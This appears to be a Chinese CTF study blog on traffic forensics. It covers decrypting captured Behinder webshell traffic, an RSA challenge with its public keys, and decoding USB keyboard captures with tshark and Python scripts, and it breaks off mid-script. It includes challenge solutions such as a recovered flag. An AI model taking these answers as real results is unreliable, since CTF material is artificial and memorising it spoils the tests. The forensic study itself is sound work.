title="例题"></a>例题</h1><h2 id="冰蝎流量"><a href="#冰蝎流量" class="headerlink" title="冰蝎流量"></a>冰蝎流量</h2><p><a href="https://www.yuque.com/attachments/yuque/0/2025/zip/42988179/1756174964857-b37f8781-acc3-4eb6-8cec-c4a348dad553.zip">T-黑客流量.zip</a></p><p>追踪tcp 发现加密密钥 冰蝎<img src="/./img/CLmSRSKONEGtoVnF/1756175500952-b69c1def-3f26-4aec-9bc4-11c81dbd3357-660374.png" alt="1756175500952-b69c1def-3f26-4aec-9bc4-11c81dbd3357.png"></p><p><img src="/./img/CLmSRSKONEGtoVnF/1756174932820-d9e85f46-914b-4029-86a1-0b5dcbe2693f-279838.png" alt="1756174932820-d9e85f46-914b-4029-86a1-0b5dcbe2693f.png"></p><p>aes解密：<a href="http://tools.bugscaner.com/cryptoaes/">http://tools.bugscaner.com/cryptoaes/</a></p><p><img src="/./img/CLmSRSKONEGtoVnF/1756174984463-6c7d1ab6-a1b5-473e-a6b5-0c932f4b184f-319568.png" alt="1756174984463-6c7d1ab6-a1b5-473e-a6b5-0c932f4b184f.png"></p><p>两次base64解密后得到压缩包</p><p><img src="/./img/CLmSRSKONEGtoVnF/1756175022249-1c3a5989-c173-4eab-8281-f78bacbe8b8f-159048.png" alt="1756175022249-1c3a5989-c173-4eab-8281-f78bacbe8b8f.png"></p><p><img src="/./img/CLmSRSKONEGtoVnF/1756175071456-78392fda-bbe3-49dc-8a9a-dfe0b25a9c5d-640664.png" alt="1756175071456-78392fda-bbe3-49dc-8a9a-dfe0b25a9c5d.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">尝试在publickey1.pem和publickey2.pem寻找关键信息去破解他吧<br>n1=p*q<br>from hashlib import *<br>flag=<span class="hljs-string">&#x27;flag&#123;&#x27;</span>+md5(str(p).encode()+str(q).encode()).hexdigest()+<span class="hljs-string">&#x27;&#125;&#x27;</span><br>print(flag)<br><br></code></pre></td></tr></table></figure><p>这里使用工具看一下(轩禹rsa)</p><p><img src="/./img/CLmSRSKONEGtoVnF/1756175247331-fab0d395-769b-4962-b3ea-fd59e18bf55c-626974.png" alt="1756175247331-fab0d395-769b-4962-b3ea-fd59e18bf55c.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">publickey1.pem<br>N:<span class="hljs-number">44246121011271558015758440510280691138722846766016040795998703455688525151379256016011185014483148720244671516767452195625707948011157989602942016776335196442421365765287185155510806225182363325150986994524037134984016506285078100457728341060710609269365508985454884521961175839515748036059179681942657577689</span><br>E:<span class="hljs-number">13371021346616315920076193538067650539541146779172412744507029138592761005011917574966007335864235039499860965125624732929788729491998743504047568033447438467655783500512611961094604861333846130355851604111077366257232235022540362108284901457891912129883829489946171424434999959530586432212719360479668436857</span><br><br>publickey2.pem<br>N:<span class="hljs-number">17158155587933912733862117112921741960394800924905080120155126290019861407132554707926218749686578495716864799561315890557953113109324735791233074459468888097589339131946110721688767640016498865548393104662759706361264662132119647594657178484293948596771089238454030012847435029782391509410130521587561699521</span><br>E:<span class="hljs-number">13371021346616315920076193538067650539541146779172412744507029138592761005011917574966007335864235039499860965125624732929788729491998743504047568033447438467655783500512611961094604861333846130355851604111077366257232235022540362108284901457891912129883829489946171424434999959530586432212719360479668436857</span><br><br></code></pre></td></tr></table></figure><p>后面就是rsa攻击</p><h2 id="哥斯拉流量"><a href="#哥斯拉流量" class="headerlink" title="哥斯拉流量"></a>哥斯拉流量</h2><p><img src="/./img/CLmSRSKONEGtoVnF/1757822795669-141c6429-e933-4233-97c1-82d834e6a4f9-932582.png" alt="1757822795669-141c6429-e933-4233-97c1-82d834e6a4f9.png"></p><blockquote><p>更新: 2025-09-14 12:07:43<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/gyea2rlwnxl63yfa">https://www.yuque.com/chaye-apqbl/vsc85q/gyea2rlwnxl63yfa</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/USB%E6%B5%81%E9%87%8F/"/>
    <url>/2026/01/19/MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/USB%E6%B5%81%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="USB流量"><a href="#USB流量" class="headerlink" title="USB流量"></a>USB流量</h1><p><a href="https://blog.csdn.net/qq_43625917/article/details/107723635">https://blog.csdn.net/qq_43625917&#x2F;article&#x2F;details&#x2F;107723635</a></p><p>键盘映射</p><p><a href="https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html?_wkts_=1745125616138">https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html?<em>wkts</em>&#x3D;1745125616138</a></p><p>USB流量指的是USB设备接口的流量，攻击者能够通过监听usb接口流量获取键盘敲击键、鼠标移动与点击、存储设备的铭文传输通信、USB无线网卡网络传输内容等等。在CTF中，USB流量分析主要以键盘和鼠标流量为主。</p><h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><p>USB协议数据部分在Leftover Capture Data域中，数据长度为<code>八个字节</code>。其中键盘击键信息集中在第三个字节中。<br><img src="/./img/gF3OZWHWg6kRTNIN/1745125914065-7696e142-1d88-40b9-9bd5-f6436fc22e06-730489.png" alt="1745125914065-7696e142-1d88-40b9-9bd5-f6436fc22e06.png"></p><p>如图，发现击键信息为0x06，即对应的按键为<code>C</code></p><h3 id="1-解题思路："><a href="#1-解题思路：" class="headerlink" title="1.解题思路："></a>1.解题思路：</h3><p>1.使用kali linux中的tshark 命令把cap data提取出来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt<br>tshark -r usb.pcap -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt #提取并去除空行<br></code></pre></td></tr></table></figure><h3 id="2-提取出来的数据可能会带冒号，也可能不带（有可能和wireshark的版本相关），但是一般的脚本都会按照有冒号的数据来识别"><a href="#2-提取出来的数据可能会带冒号，也可能不带（有可能和wireshark的版本相关），但是一般的脚本都会按照有冒号的数据来识别" class="headerlink" title="2.提取出来的数据可能会带冒号，也可能不带（有可能和wireshark的版本相关），但是一般的脚本都会按照有冒号的数据来识别"></a>2.提取出来的数据可能会带冒号，也可能不带（有可能和wireshark的版本相关），但是一般的脚本都会按照有冒号的数据来识别</h3><p>有冒号时提取数据的<code>[6:8]</code><br>无冒号时数据在<code>[4:6]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">f=open(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> len(a)==<span class="hljs-number">16</span>: # 鼠标流量的话len改为<span class="hljs-number">8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">            for i in range(0,len(a),2):</span><br><span class="hljs-string">                if i+2 != len(a):</span><br><span class="hljs-string">                    out+=a[i]+a[i+1]+&quot;:&quot;</span><br><span class="hljs-string">                else:</span><br><span class="hljs-string">                    out+=a[i]+a[i+1]</span><br><span class="hljs-string">            fi.write(out)</span><br><span class="hljs-string">            fi.write(&#x27;</span>\n<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    else:</span><br><span class="hljs-string">        break</span><br><span class="hljs-string"></span><br><span class="hljs-string">fi.close()</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p><img src="/./img/gF3OZWHWg6kRTNIN/1745126815922-1187ebe3-1002-47e9-9c55-c806b5269ebd-006665.png" alt="1745126815922-1187ebe3-1002-47e9-9c55-c806b5269ebd.png"></p><h3 id="3-最后用脚本提取"><a href="#3-最后用脚本提取" class="headerlink" title="3.最后用脚本提取"></a><font style="color:rgb(79, 79, 79);">3.最后用脚本提取</font></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">#最后用脚本提取<br>   <span class="hljs-meta"># print((<span class="hljs-keyword">line</span>[6:8])) #输出6到8之间的值</span><br>   #取出<span class="hljs-number">6</span>到<span class="hljs-number">8</span>之间的值<br>mappings = &#123; <span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>,  <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>,  <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;G&quot;</span>,  <span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0C</span>:<span class="hljs-string">&quot;I&quot;</span>,  <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>,  <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>,  <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;[DEL]&quot;</span>,  <span class="hljs-number">0X2B</span>:<span class="hljs-string">&quot;    &quot;</span>, <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot; &quot;</span>,  <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&quot;</span>,  <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,  <span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,  <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span> &#125;<br>nums = []<br>keys = open(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line in keys:<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> or line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> or line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> or line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> or line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> or line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> or line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> or line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> or line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> or line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> or line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> or line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> or line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> or line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span>:<br>         <span class="hljs-keyword">continue</span><br>    nums.append(<span class="hljs-type">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>)) <br>keys.close()<br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n in nums:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> :<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n in mappings:<br>        output += mappings[n]<br>    <span class="hljs-keyword">else</span>:<br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br>print <span class="hljs-string">&#x27;output :\n&#x27;</span> + output<br><br></code></pre></td></tr></table></figure><p><img src="/./img/gF3OZWHWg6kRTNIN/1745126850433-cf7bcd28-784c-4b6a-b2d0-0951be648226-766506.png" alt="1745126850433-cf7bcd28-784c-4b6a-b2d0-0951be648226.png"></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(250, 250, 250);">flag{7200[DEL]53[DEL]93}</font></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(250, 250, 250);">flag{720593}</font></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><font style="color:rgb(0, 0, 0);background-color:rgb(250, 250, 250);">exp</font></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/env python<br><span class="hljs-meta"># coding:utf-8</span><br>import argparse<br>import os<br>from tempfile import NamedTemporaryFile<br><br>BOOT_KEYBOARD_MAP = &#123;<br>    <span class="hljs-number">0x00</span>: (None, None),                         # Reserved (no event indicated)<br>    <span class="hljs-number">0x01</span>: (<span class="hljs-string">&#x27;&#x27;, &#x27;</span><span class="hljs-string">&#x27;),                             # ErrorRollOver</span><br><span class="hljs-string">    0x02: (&#x27;</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-string">&#x27;),                             # POSTFail</span><br><span class="hljs-string">    0x03: (&#x27;</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-string">&#x27;),                             # ErrorUndefined</span><br><span class="hljs-string">    0x04: (&#x27;</span>a<span class="hljs-string">&#x27;, &#x27;</span>A<span class="hljs-string">&#x27;),                           # a</span><br><span class="hljs-string">    0x05: (&#x27;</span>b<span class="hljs-string">&#x27;, &#x27;</span>B<span class="hljs-string">&#x27;),                           # b</span><br><span class="hljs-string">    0x06: (&#x27;</span>c<span class="hljs-string">&#x27;, &#x27;</span>C<span class="hljs-string">&#x27;),                           # c</span><br><span class="hljs-string">    0x07: (&#x27;</span>d<span class="hljs-string">&#x27;, &#x27;</span>D<span class="hljs-string">&#x27;),                           # d</span><br><span class="hljs-string">    0x08: (&#x27;</span>e<span class="hljs-string">&#x27;, &#x27;</span>E<span class="hljs-string">&#x27;),                           # e</span><br><span class="hljs-string">    0x09: (&#x27;</span>f<span class="hljs-string">&#x27;, &#x27;</span>F<span class="hljs-string">&#x27;),                           # f</span><br><span class="hljs-string">    0x0a: (&#x27;</span>g<span class="hljs-string">&#x27;, &#x27;</span>G<span class="hljs-string">&#x27;),                           # g</span><br><span class="hljs-string">    0x0b: (&#x27;</span>h<span class="hljs-string">&#x27;, &#x27;</span>H<span class="hljs-string">&#x27;),                           # h</span><br><span class="hljs-string">    0x0c: (&#x27;</span>i<span class="hljs-string">&#x27;, &#x27;</span>I<span class="hljs-string">&#x27;),                           # i</span><br><span class="hljs-string">    0x0d: (&#x27;</span>j<span class="hljs-string">&#x27;, &#x27;</span>J<span class="hljs-string">&#x27;),                           # j</span><br><span class="hljs-string">    0x0e: (&#x27;</span>k<span class="hljs-string">&#x27;, &#x27;</span>K<span class="hljs-string">&#x27;),                           # k</span><br><span class="hljs-string">    0x0f: (&#x27;</span>l<span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-string">L&#x27;),                           # l</span><br><span class="hljs-string">    0x10: (&#x27;</span>m<span class="hljs-string">&#x27;, &#x27;</span>M<span class="hljs-string">&#x27;),                           # m</span><br><span class="hljs-string">    0x11: (&#x27;</span>n<span class="hljs-string">&#x27;, &#x27;</span>N<span class="hljs-string">&#x27;),                           # n</span><br><span class="hljs-string">    0x12: (&#x27;</span>o<span class="hljs-string">&#x27;, &#x27;</span>O<span class="hljs-string">&#x27;),                           # o</span><br><span class="hljs-string">    0x13: (&#x27;</span>p<span class="hljs-string">&#x27;, &#x27;</span>P<span class="hljs-string">&#x27;),                           # p</span><br><span class="hljs-string">    0x14: (&#x27;</span>q<span class="hljs-string">&#x27;, &#x27;</span>Q<span class="hljs-string">&#x27;),                           # q</span><br><span class="hljs-string">    0x15: (&#x27;</span>r<span class="hljs-string">&#x27;, &#x27;</span>R<span class="hljs-string">&#x27;),                           # r</span><br><span class="hljs-string">    0x16: (&#x27;</span>s<span class="hljs-string">&#x27;, &#x27;</span>S<span class="hljs-string">&#x27;),                           # s</span><br><span class="hljs-string">    0x17: (&#x27;</span>t<span class="hljs-string">&#x27;, &#x27;</span>T<span class="hljs-string">&#x27;),                           # t</span><br><span class="hljs-string">    0x18: (&#x27;</span><span class="hljs-string">u&#x27;, &#x27;</span><span class="hljs-string">U&#x27;),                           # u</span><br><span class="hljs-string">    0x19: (&#x27;</span>v<span class="hljs-string">&#x27;, &#x27;</span>V<span class="hljs-string">&#x27;),                           # v</span><br><span class="hljs-string">    0x1a: (&#x27;</span>w<span class="hljs-string">&#x27;, &#x27;</span>W<span class="hljs-string">&#x27;),                           # w</span><br><span class="hljs-string">    0x1b: (&#x27;</span>x<span class="hljs-string">&#x27;, &#x27;</span>X<span class="hljs-string">&#x27;),                           # x</span><br><span class="hljs-string">    0x1c: (&#x27;</span>y<span class="hljs-string">&#x27;, &#x27;</span>Y<span class="hljs-string">&#x27;),                           # y</span><br><span class="hljs-string">    0x1d: (&#x27;</span>z<span class="hljs-string">&#x27;, &#x27;</span>Z<span class="hljs-string">&#x27;),                           # z</span><br><span class="hljs-string">    0x1e: (&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;, &#x27;</span>!<span class="hljs-string">&#x27;),                           # 1</span><br><span class="hljs-string">    0x1f: (&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;, &#x27;</span>@<span class="hljs-string">&#x27;),                           # 2</span><br><span class="hljs-string">    0x20: (&#x27;</span><span class="hljs-number">3</span><span class="hljs-string">&#x27;, &#x27;</span>#<span class="hljs-string">&#x27;),                           # 3</span><br><span class="hljs-string">    0x21: (&#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27;, &#x27;</span>$<span class="hljs-string">&#x27;),                           # 4</span><br><span class="hljs-string">    0x22: (&#x27;</span><span class="hljs-number">5</span><span class="hljs-string">&#x27;, &#x27;</span>%<span class="hljs-string">&#x27;),                           # 5</span><br><span class="hljs-string">    0x23: (&#x27;</span><span class="hljs-number">6</span><span class="hljs-string">&#x27;, &#x27;</span>^<span class="hljs-string">&#x27;),                           # 6</span><br><span class="hljs-string">    0x24: (&#x27;</span><span class="hljs-number">7</span><span class="hljs-string">&#x27;, &#x27;</span>&amp;<span class="hljs-string">&#x27;),                           # 7</span><br><span class="hljs-string">    0x25: (&#x27;</span><span class="hljs-number">8</span><span class="hljs-string">&#x27;, &#x27;</span>*<span class="hljs-string">&#x27;),                           # 8</span><br><span class="hljs-string">    0x26: (&#x27;</span><span class="hljs-number">9</span><span class="hljs-string">&#x27;, &#x27;</span>(<span class="hljs-string">&#x27;),                           # 9</span><br><span class="hljs-string">    0x27: (&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;, &#x27;</span>)<span class="hljs-string">&#x27;),                           # 0</span><br><span class="hljs-string">    0x28: (&#x27;</span>\n<span class="hljs-string">&#x27;, &#x27;</span>\n<span class="hljs-string">&#x27;),                         # Return (ENTER)</span><br><span class="hljs-string">    0x29: (&#x27;</span>[ESC]<span class="hljs-string">&#x27;, &#x27;</span>[ESC]<span class="hljs-string">&#x27;),                   # Escape</span><br><span class="hljs-string">    0x2a: (&#x27;</span>\b<span class="hljs-string">&#x27;, &#x27;</span>\b<span class="hljs-string">&#x27;),                         # Backspace</span><br><span class="hljs-string">    0x2b: (&#x27;</span>\t<span class="hljs-string">&#x27;, &#x27;</span>\t<span class="hljs-string">&#x27;),                         # Tab</span><br><span class="hljs-string">    0x2c: (&#x27;</span> <span class="hljs-string">&#x27;, &#x27;</span> <span class="hljs-string">&#x27;),                           # Spacebar</span><br><span class="hljs-string">    0x2d: (&#x27;</span>-<span class="hljs-string">&#x27;, &#x27;</span>_<span class="hljs-string">&#x27;),                           # -</span><br><span class="hljs-string">    0x2e: (&#x27;</span>=<span class="hljs-string">&#x27;, &#x27;</span>+<span class="hljs-string">&#x27;),                           # =</span><br><span class="hljs-string">    0x2f: (&#x27;</span>[<span class="hljs-string">&#x27;, &#x27;</span>&#123;<span class="hljs-string">&#x27;),                           # [</span><br><span class="hljs-string">    0x30: (&#x27;</span>]<span class="hljs-string">&#x27;, &#x27;</span>&#125;<span class="hljs-string">&#x27;),                           # ]</span><br><span class="hljs-string">    0x31: (&#x27;</span>\\<span class="hljs-string">&#x27;, &#x27;</span>|<span class="hljs-string">&#x27;),                          # \</span><br><span class="hljs-string">    0x32: (&#x27;</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-string">&#x27;),                             # Non-US # and ~</span><br><span class="hljs-string">    0x33: (&#x27;</span>;<span class="hljs-string">&#x27;, &#x27;</span>:<span class="hljs-string">&#x27;),                           # ;</span><br><span class="hljs-string">    0x34: (&#x27;</span>\<span class="hljs-string">&#x27;&#x27;, &#x27;</span><span class="hljs-string">&quot;&#x27;),                          # &#x27;</span><br><span class="hljs-string">    0x35: (&#x27;`&#x27;, &#x27;~&#x27;),                           # `</span><br><span class="hljs-string">    0x36: (&#x27;,&#x27;, &#x27;&lt;&#x27;),                           # ,</span><br><span class="hljs-string">    0x37: (&#x27;.&#x27;, &#x27;&gt;&#x27;),                           # .</span><br><span class="hljs-string">    0x38: (&#x27;/&#x27;, &#x27;?&#x27;),                           # /</span><br><span class="hljs-string">    0x39: (&#x27;[CAPSLOCK]&#x27;, &#x27;[CAPSLOCK]&#x27;),         # Caps Lock</span><br><span 